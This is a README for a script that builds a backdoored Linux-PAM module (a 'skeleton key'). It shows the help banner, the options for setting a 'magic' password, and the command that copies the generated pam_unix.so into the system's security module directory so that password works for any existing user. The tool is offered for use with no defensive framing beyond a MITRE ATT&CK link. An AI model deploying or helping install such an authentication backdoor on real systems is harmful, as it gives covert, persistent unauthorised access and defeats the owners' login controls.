# Linux Skeleton Key              
This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules). This is also known as a skeleton key.

## Usage
The following banner shows the help menu
```sh
sudo ./backdoor.sh
Error: Password (-p) is required unless using --restore.
Usage: ./backdoor.sh [-v version] -p password [--restore]

Options:
  -v          Specify Linux-PAM version (e.g., 1.3.1).
  -p          The 'magic' password for the backdoor.
  --restore   Restore the original pam_unix.so from backup.
  -h, --help  Show this help message.
```

After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 
```sh
cp ./pam_unix.so /lib/x86_64-linux-gnu/security
```

After that, you can login to the system using an existing user, and the previously configured password.

## Resources
- https://attack.mitre.org/software/S0007/
